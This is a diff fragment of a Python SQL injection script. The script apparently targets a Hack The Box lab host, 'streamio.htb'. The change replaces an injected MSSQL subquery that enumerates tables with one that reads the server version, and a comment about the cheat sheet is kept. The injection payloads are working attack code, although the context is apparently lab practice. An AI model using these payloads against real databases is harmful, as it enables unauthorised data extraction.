@@ -14,8 +14,8 @@ target = 'https://watch.streamio.htb/search.php'
 headers = CaseInsensitiveDict()
 headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 data={}
-#This is the "payload" that will be inserted inside the substring function
-function = "(SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name>'users')"
+#This is the "payload" that will be inserted inside the substring function, modify it in order to get the query results.
+function = "(@@version)"
 
 #A very good cheatsheet for MSSQL Databases --> https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
 
